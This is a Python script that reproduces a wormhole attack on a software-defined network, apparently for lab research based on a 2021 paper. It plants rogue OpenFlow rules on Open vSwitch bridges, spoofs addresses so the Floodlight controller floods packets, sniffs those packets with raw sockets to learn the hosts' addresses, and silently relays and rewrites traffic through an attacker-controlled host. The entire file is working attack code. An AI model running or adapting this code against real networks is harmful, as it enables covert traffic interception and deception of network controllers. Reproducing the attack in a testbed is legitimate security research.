import random
import select
import socket
import struct
import subprocess
import threading
import time

# ── Topology constants ─────────────────────────────────────────────────────────

RELAY_IFACE = "relay-eth0"
RELAY_MAC   = "00:00:00:00:00:0c"
# RELAY_IP    = "10.0.0.12"
RELAY_IP    = "10.1.0.3"

# Flow priorities — all above Floodlight's default (~1)
PRI_CATCHALL = 200    # Step 3: catch-all on intercepting switch
PRI_PHASE2   = 300    # Step 5: phase-2 flow on intercepting switch
PRI_RECOVERY = 400    # Step 6: address-recovery flow on destination switch
PRI_DATA_FWD = 500    # Step 7: data-forwarding flow on intercepting switch (highest)

SNIFF_TIMEOUT = 30    # seconds per broadcast sniff phase

# ── Wormhole topology: both switch sides ───────────────────────────────────────
# To add a new host: add an entry to the relevant bridge's "hosts" dict.
# The relay automatically handles all combinations across both sides.
#
#   SWITCH_SIDES[bridge]["hosts"] = { hostname: (switch_port, host_ip) }
# No uplink_port needed — all phases use FLOOD, so relay is reachable at any hop.

SWITCH_SIDES = {
    "s1": {
        "hosts": {
            "ha": (4, "10.1.0.1"),   # abilene.py EXTRA_HOSTS → s1 port4
        },
    },
    "s6": {
        "hosts": {
            "hb": (4, "10.1.0.2"),   # abilene.py EXTRA_HOSTS → s6 port4
        },
    },
}

# IP → (bridge, port) lookup — used after Phase B to find the recovery switch/port
# for whichever destination was discovered dynamically.
IP_TO_SWITCH_PORT: dict = {
    ip: (bridge, port)
    for bridge, side in SWITCH_SIDES.items()
    for _hname, (port, ip) in side["hosts"].items()
}

# One interceptor per host-port on each switch side.
# Each worker handles whichever destination its source host happens to send to —
# no combinatorial explosion of workers; recovery info is resolved after Phase B.
INTERCEPTORS: list = [
    {
        "name":             f"{hname}→*",
        "intercept_bridge": bridge,
        "intercept_port":   port,
    }
    for bridge, side in SWITCH_SIDES.items()
    for hname, (port, _ip) in side["hosts"].items()
]

# ── OVS flow helpers ───────────────────────────────────────────────────────────

def _run(cmd: str) -> None:
    print(f"  $ {cmd}")
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode != 0 and r.stderr.strip():
        print(f"  [!] {r.stderr.strip()}")


def add_flow(bridge: str, priority: int, match: str, actions: str) -> None:
    flow = f"priority={priority},{match},actions={actions}"
    _run(f"ovs-ofctl -O OpenFlow15 add-flow {bridge} '{flow}'")


def del_flow(bridge: str, match: str) -> None:
    _run(f"ovs-ofctl -O OpenFlow15 del-flows --strict {bridge} '{match}'")


# ── Random bogus-address generators ───────────────────────────────────────────

def _random_vip() -> str:
    """Non-routable IP absent from the controller's Host Profile."""
    return f"192.168.200.{random.randint(2, 254)}"


def _random_vmac() -> str:
    """Locally-administered unicast MAC absent from the controller's Host Profile."""
    tail = [random.randint(0, 255) for _ in range(3)]
    return "02:aa:bb:" + ":".join(f"{b:02x}" for b in tail)


# ── Step 3: Catch-all flow on intercepting switch ─────────────────────────────

def install_catchall(direction: dict, vip: str) -> None:
    """
    Low-priority catch-all on the intercepting switch.

    Matches all IP traffic arriving from the source host port.
    Replaces ip_dst with vIP — absent from the controller's Host Profile —
    then FLOODs so the packet reaches the relay regardless of how many hops
    away it is (n-hop relay support).

    steps.txt Step 3: "dst IP → vIP (random fake IP)"
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_CATCHALL,
        match=f"in_port={direction['intercept_port']},ip",
        actions=f"set_field:{vip}->ip_dst,FLOOD",
    )
    print(f"[+] [{direction['name']}] Catch-all on {direction['intercept_bridge']}: "
          f"in_port={direction['intercept_port']},ip  →  ip_dst={vip}, FLOOD")


# ── Raw socket packet parsing helpers ────────────────────────────────────────

def parse_ethernet(frame: bytes) -> dict:
    """Parse Ethernet header (14 bytes)."""
    dst_mac = frame[0:6]
    src_mac = frame[6:12]
    eth_type = struct.unpack("!H", frame[12:14])[0]
    return {
        "dst_mac": ":".join(f"{b:02x}" for b in dst_mac),
        "src_mac": ":".join(f"{b:02x}" for b in src_mac),
        "eth_type": eth_type,
        "payload": frame[14:]
    }


def parse_ipv4(ip_packet: bytes) -> dict:
    """Parse IPv4 header (minimum 20 bytes)."""
    version_ihl = ip_packet[0]
    ihl = (version_ihl & 0x0F) * 4  # Header length in bytes
    protocol = ip_packet[9]
    src_ip = socket.inet_ntoa(ip_packet[12:16])
    dst_ip = socket.inet_ntoa(ip_packet[16:20])
    return {
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "protocol": protocol,
        "header_len": ihl,
        "payload": ip_packet[ihl:]
    }


def ip_to_bytes(ip_str: str) -> bytes:
    """Convert IP address string to 4-byte representation."""
    return socket.inet_aton(ip_str)


# ── Step 4: Phase A — sniff first broadcast, extract sMAC / dMAC / sIP ────────

def sniff_phase_a(direction: dict, vip: str) -> dict:
    """
    Sniff the controller-flooded packet carrying ip_dst = vIP.

    Floodlight has no Host Profile for vIP → FLOOD on all s1 ports →
    relay-eth0 receives a copy.

    Extracts (all untouched by the catch-all):
      sMAC ← eth_src  (source host MAC)
      dMAC ← eth_dst  (destination host MAC)
      sIP  ← ip_src   (source host IP)

    steps.txt Step 4: "Relay extracts sIP, sMAC, dMAC"
    
    Uses raw socket instead of Scapy for packet sniffing.
    """
    print(f"\n[*] [{direction['name']}] Phase A — waiting for vIP={vip} on "
          f"{RELAY_IFACE} (timeout={SNIFF_TIMEOUT}s) …")
    found: dict = {}
    
    # Create raw socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))  # ETH_P_IP
        sock.bind((RELAY_IFACE, 0))
        sock.settimeout(SNIFF_TIMEOUT)
    except PermissionError:
        raise RuntimeError("Raw socket requires root privileges. Run with sudo.")
    
    vip_bytes = ip_to_bytes(vip)
    start_time = time.time()
    
    try:
        while time.time() - start_time < SNIFF_TIMEOUT:
            try:
                frame, _ = sock.recvfrom(65535)
                
                # Parse Ethernet header
                if len(frame) < 14:
                    continue
                eth = parse_ethernet(frame)
                
                # Check if it's IPv4 (0x0800)
                if eth["eth_type"] != 0x0800:
                    continue
                
                # Parse IP header
                if len(eth["payload"]) < 20:
                    continue
                ip = parse_ipv4(eth["payload"])
                
                # Check if destination IP matches vip
                if ip["dst_ip"] == vip:
                    found["sMAC"] = eth["src_mac"]
                    found["dMAC"] = eth["dst_mac"]
                    found["sIP"] = ip["src_ip"]
                    break
                    
            except socket.timeout:
                continue
                
    finally:
        sock.close()
    
    if not found:
        raise TimeoutError(
            f"[{direction['name']}] Phase A timed out: no flooded packet with "
            f"ip_dst={vip} on {RELAY_IFACE} within {SNIFF_TIMEOUT}s.\n"
            "  → Is fake_lldp_inject.py running?  Is traffic flowing?"
        )

    print(f"[+] [{direction['name']}] Phase A done  →  "
          f"sMAC={found['sMAC']}  dMAC={found['dMAC']}  sIP={found['sIP']}")
    return found


# ── Step 5 (part 1): Phase-2 flow on intercepting switch ──────────────────────

def install_phase2(direction: dict, dmac: str, vmac: str) -> None:
    """
    High-priority phase-2 flow on the intercepting switch (installed after Phase A).

    Matches the NEXT packet from source host with original dl_dst = dMAC.
    Replaces eth_dst with vMAC — absent from Host Profile.
    ip_dst is left INTACT (= original dIP), which relay reads in Phase B.

    steps.txt Step 5: "dst MAC → vMAC, dst IP restored to original"
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_PHASE2,
        match=f"in_port={direction['intercept_port']},ip,dl_dst={dmac}",
        actions=f"set_field:{vmac}->eth_dst,FLOOD",
    )
    print(f"[+] [{direction['name']}] Phase-2 flow on {direction['intercept_bridge']}: "
          f"dl_dst={dmac}  →  eth_dst={vmac}, FLOOD")


# ── Step 5 (part 2): Phase B — sniff second broadcast, extract dIP ────────────

def sniff_phase_b(direction: dict, vmac: str) -> str:
    """
    Sniff the controller-flooded packet carrying eth_dst = vMAC.

    Floodlight has no Host Profile for vMAC → floods.
    ip_dst in this packet is the ORIGINAL dIP (destination host's IP), untouched.

    steps.txt Step 5: "Relay captures second broadcast and extracts dIP"
    
    Uses raw socket instead of Scapy for packet sniffing.
    """
    print(f"[*] [{direction['name']}] Phase B — waiting for vMAC={vmac} on "
          f"{RELAY_IFACE} (timeout={SNIFF_TIMEOUT}s) …")
    found: dict = {}
    
    # Create raw socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))  # ETH_P_ALL
        sock.bind((RELAY_IFACE, 0))
        sock.settimeout(SNIFF_TIMEOUT)
    except PermissionError:
        raise RuntimeError("Raw socket requires root privileges. Run with sudo.")
    
    vmac_normalized = vmac.lower()
    start_time = time.time()
    
    try:
        while time.time() - start_time < SNIFF_TIMEOUT:
            try:
                frame, _ = sock.recvfrom(65535)
                
                # Parse Ethernet header
                if len(frame) < 14:
                    continue
                eth = parse_ethernet(frame)
                
                # Check if destination MAC matches vmac
                if eth["dst_mac"].lower() != vmac_normalized:
                    continue
                
                # Check if it's IPv4 (0x0800)
                if eth["eth_type"] != 0x0800:
                    continue
                
                # Parse IP header to extract dIP
                if len(eth["payload"]) < 20:
                    continue
                ip = parse_ipv4(eth["payload"])
                
                found["dIP"] = ip["dst_ip"]
                break
                
            except socket.timeout:
                continue
                
    finally:
        sock.close()

    if not found:
        raise TimeoutError(
            f"[{direction['name']}] Phase B timed out: no flooded packet with "
            f"eth_dst={vmac} on {RELAY_IFACE} within {SNIFF_TIMEOUT}s."
        )

    print(f"[+] [{direction['name']}] Phase B done  →  dIP={found['dIP']}")
    return found["dIP"]


# ── Step 6: Recovery flow on destination switch ────────────────────────────────

def install_recovery(direction: dict, smac: str, dmac: str,
                     sip: str, dip: str) -> None:
    """
    Install address-recovery flow on the destination switch.

    Matches relay-forwarded packets arriving with ip_dst = dIP.
    Restores all original source and destination addresses before
    the switch delivers to the destination host.

    steps.txt Step 6:
      match:   ip_dst = dIP
      actions: set ip_src=sIP, set ip_dst=dIP,
               set eth_src=sMAC, set eth_dst=dMAC,
               output: port_to_host

    steps.txt Step 8: "Recovery flow entry fires. Restores all fields. Forwards to host."
    """
    add_flow(
        bridge=direction["recovery_bridge"],
        priority=PRI_RECOVERY,
        match=f"ip,nw_dst={dip}",
        actions=(
            f"set_field:{smac}->eth_src,"
            f"set_field:{sip}->ip_src,"
            f"set_field:{dmac}->eth_dst,"
            f"set_field:{dip}->ip_dst,"
            f"output:{direction['recovery_host_port']}"
        ),
    )
    print(f"[+] [{direction['name']}] Recovery flow on {direction['recovery_bridge']}: "
          f"ip_dst={dip}  →  restore {smac}/{sip} → {dmac}/{dip}, "
          f"out:{direction['recovery_host_port']}")


# ── Temporary flow cleanup ─────────────────────────────────────────────────────

def cleanup_temp_flows(direction: dict, dmac: str) -> None:
    """Remove catch-all and phase-2 flows from intercepting switch — address delivery complete."""
    del_flow(direction["intercept_bridge"],
             f"in_port={direction['intercept_port']},ip,priority={PRI_CATCHALL}")
    del_flow(direction["intercept_bridge"],
             f"in_port={direction['intercept_port']},ip,dl_dst={dmac},priority={PRI_PHASE2}")
    print(f"[+] [{direction['name']}] Temporary catch-all and phase-2 flows removed "
          f"from {direction['intercept_bridge']}")


# ── Step 7 (OVS flow): Data-forwarding flow on intercepting switch ─────────────

def install_data_forward_flow(direction: dict, smac: str, sip: str,
                               dmac: str, dip: str) -> None:
    """
    Install permanent data-forwarding flow on the intercepting switch.

    Matches the original source→destination flow (exact src/dst MAC+IP).
    Redirects to the relay host by rewriting the destination address:
        eth_dst ← RELAY_MAC
        ip_dst  ← RELAY_IP

    Source address is left unchanged so relay can identify the flow.
    FLOODs so the packet reaches relay-eth0 regardless of hop count.

    steps.txt Step 7: relay receives and forwards the actual data packet
                      toward the destination switch.
    """
    add_flow(
        bridge=direction["intercept_bridge"],
        priority=PRI_DATA_FWD,
        match=(
            f"in_port={direction['intercept_port']},ip,"
            f"dl_src={smac},dl_dst={dmac},"
            f"nw_src={sip},nw_dst={dip}"
        ),
        actions=(
            f"set_field:{RELAY_MAC}->eth_dst,"
            f"set_field:{RELAY_IP}->ip_dst,"
            f"FLOOD"
        ),
    )
    print(f"[+] [{direction['name']}] Data-fwd flow on {direction['intercept_bridge']}: "
          f"{smac}/{sip}→{dmac}/{dip}  →  relay({RELAY_IP})")


# ── Step 7 (relay loop): Forward intercepted packets to destination switch ─────

def relay_packet_loop(direction: dict, info: dict,
                      stop_event: threading.Event) -> None:
    """
    Continuously forward data packets from the intercepting switch to the
    destination switch side.

    Uses raw AF_PACKET sockets for minimal added latency.

    Packets arriving on relay-eth0 (from the data-forwarding flow) have:
        eth_dst = RELAY_MAC,  ip_dst = RELAY_IP   (addressed to relay)
        eth_src = sMAC,       ip_src = sIP         (original source, unchanged)
        payload = original source→destination L4 payload

    Relay re-addresses each packet for delivery to the destination switch:
        eth_src ← RELAY_MAC   (relay is the new source)
        ip_src  ← RELAY_IP
        eth_dst ← dMAC        (destination host's real MAC)
        ip_dst  ← dIP         (destination host's real IP)

    steps.txt Step 7:
      "src IP = relay IP, src MAC = relay MAC,
       dst IP = dIP (real), dst MAC = dMAC (real)"

    steps.txt Step 8:
      Destination switch recovery flow matches ip_dst=dIP, restores all
      original addresses, and delivers to destination host.

    Latency optimisations:
      - recv_into: pre-allocated bytearray reused every packet (no heap alloc)
      - Incremental RFC 1624 checksum: precomputed delta, ~3 ops per packet
        instead of iterating the full IP header
      - select() polling: no exception overhead on idle intervals
      - Direct bytearray send: no bytes() copy on transmit
      - Large SO_RCVBUF / SO_SNDBUF: absorbs bursts, prevents drops
    """
    smac_b      = bytes.fromhex(info["sMAC"].replace(":", ""))
    dmac_b      = bytes.fromhex(info["dMAC"].replace(":", ""))
    relay_mac_b = bytes.fromhex(RELAY_MAC.replace(":", ""))
    relay_ip_b  = socket.inet_aton(RELAY_IP)
    sip_b       = socket.inet_aton(info["sIP"])
    dip_b       = socket.inet_aton(info["dIP"])

    # Prevent relay's kernel from generating ICMP-unreachable replies
    # for packets addressed to RELAY_IP from this flow's source.
    _run(f"iptables -A INPUT -s {info['sIP']} -d {RELAY_IP} -j DROP")

    ETH_P_IP = 0x0800
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
    sock.bind((RELAY_IFACE, 0))
    # Large buffers absorb bursts without dropping frames.
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    # Non-blocking: driven by select() below.
    sock.setblocking(False)

    # ── Precompute RFC 1624 incremental checksum delta ──────────────────────
    # We change two IP address fields on every packet:
    #   ip_src: sIP     → RELAY_IP   (IP header bytes 12-15)
    #   ip_dst: RELAY_IP → dIP       (IP header bytes 16-19)
    #
    # RFC 1624 per changed 16-bit word: delta_i = (~old_word & 0xFFFF) + new_word
    # Since RELAY_IP appears as both new ip_src word AND old ip_dst word its
    # contribution collapses to 0xFFFF per word pair, leaving:
    #   csum_delta = (~sip_w0 & 0xFFFF) + 0xFFFF + dip_w0
    #              + (~sip_w1 & 0xFFFF) + 0xFFFF + dip_w1
    sip_w0, sip_w1 = struct.unpack('!HH', sip_b)
    dip_w0, dip_w1 = struct.unpack('!HH', dip_b)
    csum_delta = ((0xFFFF ^ sip_w0) + 0xFFFF + dip_w0 +
                  (0xFFFF ^ sip_w1) + 0xFFFF + dip_w1)

    # Pre-allocate a single receive buffer reused for every packet.
    buf = bytearray(65536)
    mv  = memoryview(buf)

    # ── Deduplication: same IP-ID seen via multiple flood paths ────────────────
    # FLOOD sends the packet out all ports; the same frame can arrive at the relay
    # via several routes. Track (ip_id, protocol) of recently forwarded packets
    # and drop duplicates within a short window.
    _seen: dict = {}          # (ip_id, proto) → last_forward_time
    _DEDUP_WINDOW = 1.0       # seconds — larger than any realistic RTT

    print(f"[*] [{direction['name']}] Relay loop active (raw socket): "
          f"forwarding to {info['dIP']} ({info['dMAC']})")

    while not stop_event.is_set():
        # select() with 0.2 s timeout: cheaper than exception-based settimeout
        if not select.select([sock], [], [], 0.2)[0]:
            # Expire old dedup entries to prevent unbounded growth
            now = time.monotonic()
            expired = [k for k, t in _seen.items() if now - t > _DEDUP_WINDOW]
            for k in expired:
                del _seen[k]
            continue

        try:
            nbytes = sock.recv_into(mv)   # zero-copy into pre-allocated buffer
        except BlockingIOError:
            continue

        if nbytes < 34:
            continue

        # Fast-path filter: must be IPv4 addressed to RELAY_MAC
        if buf[0:6] != relay_mac_b or buf[12:14] != b'\x08\x00':
            continue

        # Flow filter: ip_src=sIP, ip_dst=RELAY_IP (identifies this flow's packets)
        if buf[26:30] != sip_b or buf[30:34] != relay_ip_b:
            continue

        # Dedup: drop if same (ip_id, protocol) seen within DEDUP_WINDOW
        ip_id = (buf[18] << 8) | buf[19]   # IP identification field (bytes 18-19)
        proto = buf[23]                      # IP protocol field
        dedup_key = (ip_id, proto)
        now = time.monotonic()
        if dedup_key in _seen and now - _seen[dedup_key] < _DEDUP_WINDOW:
            continue                          # duplicate from flood — drop
        _seen[dedup_key] = now

        # ── Rewrite addresses in-place ───────────────────────────────────────
        # steps.txt Step 7: src=relay, dst=destination's real MAC/IP
        buf[0:6]   = dmac_b       # eth_dst = dMAC
        buf[6:12]  = relay_mac_b  # eth_src = RELAY_MAC
        buf[26:30] = relay_ip_b   # ip_src  = RELAY_IP
        buf[30:34] = dip_b        # ip_dst  = dIP

        # ── Incremental IP checksum update (RFC 1624) ────────────────────────
        # ~HC + delta, then fold carries twice, then complement.
        old_hc = (buf[24] << 8) | buf[25]
        s = (0xFFFF ^ old_hc) + csum_delta
        s = (s & 0xFFFF) + (s >> 16)
        s = (s & 0xFFFF) + (s >> 16)   # at most two folds needed
        new_hc = (~s) & 0xFFFF
        buf[24] = new_hc >> 8
        buf[25] = new_hc & 0xFF

        try:
            sock.send(mv[:nbytes])    # send slice of pre-allocated buf directly
        except OSError:
            pass

    sock.close()
    _run(f"iptables -D INPUT -s {info['sIP']} -d {RELAY_IP} -j DROP")
    print(f"[*] [{direction['name']}] Relay loop stopped for flow →{info['dIP']}")


# ── Full address-delivery + data-forwarding sequence for one interceptor ───────

def run_address_delivery(interceptor: dict) -> dict:
    """
    Execute the complete steps.txt sequence (Steps 3-8) for one flow.

    The interceptor specifies the source-side switch and port only.
    After Phase B reveals dIP, the recovery switch and port are looked up
    dynamically from IP_TO_SWITCH_PORT — so any known destination is handled
    without needing a pre-enumerated direction list.

    Returns dict: {sMAC, dMAC, sIP, dIP, vIP, vMAC, thread, stop_event, direction}
    """
    vip  = _random_vip()
    vmac = _random_vmac()

    print(f"\n{'═' * 60}")
    print(f" Create Mismatch — {interceptor['name']}")
    print(f"   vIP  = {vip}   (Phase A bogus ip_dst)")
    print(f"   vMAC = {vmac}   (Phase B bogus eth_dst)")
    print(f"{'═' * 60}")

    # ── Address delivery (Steps 3-5) ────────────────────────────────────────
    install_catchall(interceptor, vip)                          # Step 3
    info = sniff_phase_a(interceptor, vip)                     # Step 4
    install_phase2(interceptor, info["dMAC"], vmac)            # Step 5 (install)
    info["dIP"] = sniff_phase_b(interceptor, vmac)             # Step 5 (sniff)

    # ── Resolve recovery switch + port from the learned destination IP ───────
    if info["dIP"] not in IP_TO_SWITCH_PORT:
        raise ValueError(
            f"[{interceptor['name']}] Unknown destination IP {info['dIP']} — "
            "not in any configured switch side. Add the host to SWITCH_SIDES."
        )
    recovery_bridge, recovery_host_port = IP_TO_SWITCH_PORT[info["dIP"]]

    # Build a fully-resolved direction dict (interceptor + recovery info).
    # The name is updated from "hX→*" to "hX→hY" once dIP is known.
    dst_name = next(
        (hn for _, side in SWITCH_SIDES.items()
         for hn, (_, ip) in side["hosts"].items()
         if ip == info["dIP"]),
        info["dIP"],   # fallback to raw IP if host not named
    )
    direction = {
        **interceptor,
        "name":               interceptor["name"].replace("*", dst_name),
        "recovery_bridge":    recovery_bridge,
        "recovery_host_port": recovery_host_port,
    }

    # ── Step 6: Recovery flow on destination switch ──────────────────────────
    install_recovery(
        direction=direction,
        smac=info["sMAC"],
        dmac=info["dMAC"],
        sip=info["sIP"],
        dip=info["dIP"],
    )
    info.update(vIP=vip, vMAC=vmac)
    cleanup_temp_flows(direction, info["dMAC"])

    print(f"\n[✓] [{direction['name']}] Address delivery complete (2 packets):")
    print(f"    sMAC={info['sMAC']}  sIP={info['sIP']}")
    print(f"    dMAC={info['dMAC']}  dIP={info['dIP']}")

    # ── Step 7: Data-forwarding flow + relay loop ────────────────────────────
    install_data_forward_flow(                                # Step 7 (OVS flow)
        direction=direction,
        smac=info["sMAC"],
        sip=info["sIP"],
        dmac=info["dMAC"],
        dip=info["dIP"],
    )

    stop_event = threading.Event()                            # Step 7 (relay loop)
    t = threading.Thread(
        target=relay_packet_loop,
        args=(direction, info, stop_event),
        daemon=True,
        name=f"relay[{direction['name']}]→{info['dIP']}",
    )
    t.start()
    print(f"[*] [{direction['name']}] Relay thread started: {t.name}")

    info["stop_event"] = stop_event
    info["thread"]     = t
    info["direction"]  = direction
    return info


# ── Per-interceptor worker ─────────────────────────────────────────────────────

def interceptor_worker(interceptor: dict, learned: dict,
                       learned_lock: threading.Lock) -> None:
    """
    Continuously process new flows for one source host-port.
    The destination is resolved dynamically each time from IP_TO_SWITCH_PORT.
    Restarts address delivery on timeout or unknown destination.
    """
    while True:
        try:
            info = run_address_delivery(interceptor)
            direction = info["direction"]
            with learned_lock:
                learned[f"{direction['name']}:{info['dIP']}"] = info
            print(f"\n[*] [{direction['name']}] Active. Waiting for next flow …\n")

        except (TimeoutError, ValueError) as exc:
            print(f"\n[!] {exc}")
            print(f"[*] [{interceptor['name']}] Restarting address-delivery sequence …\n")


# ── Entry point ────────────────────────────────────────────────────────────────

def main() -> None:
    sides_summary = "  ".join(
        f"{br}: {', '.join(SWITCH_SIDES[br]['hosts'])}"
        for br in SWITCH_SIDES
    )
    print(f"""
+----------------------------------------------------------+
|  Create Mismatch  --  Section III.C.4.3  (complete)      |
|  "Flow Misleading: Worm-Hole Attack in SDN" (2021)       |
|                                                          |
|  Sides : {sides_summary:<48}|
|  Relay : relay-eth0  ({RELAY_IP})                    |
|                                                          |
|  Address delivery : 2 broadcast packets per interceptor  |
|  Data forwarding  : continuous relay thread per flow     |
|  Destinations     : resolved dynamically after Phase B   |
+----------------------------------------------------------+
""")

    learned:      dict           = {}
    learned_lock: threading.Lock = threading.Lock()

    workers = []
    for interceptor in INTERCEPTORS:
        t = threading.Thread(
            target=interceptor_worker,
            args=(interceptor, learned, learned_lock),
            daemon=True,
            name=f"worker[{interceptor['name']}]",
        )
        t.start()
        workers.append(t)
        print(f"[*] Started worker for interceptor {interceptor['name']} "
              f"({interceptor['intercept_bridge']} port {interceptor['intercept_port']})")

    try:
        for t in workers:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted — stopping relay threads and cleaning up …")
        with learned_lock:
            for flow_info in learned.values():
                flow_info["stop_event"].set()
            # Remove all installed flows
            for flow_info in learned.values():
                d = flow_info["direction"]
                del_flow(d["intercept_bridge"],
                         f"in_port={d['intercept_port']},ip")
                del_flow(d["recovery_bridge"],
                         f"ip,nw_dst={flow_info['dIP']}")
        print("[*] Done.")


if __name__ == "__main__":
    main()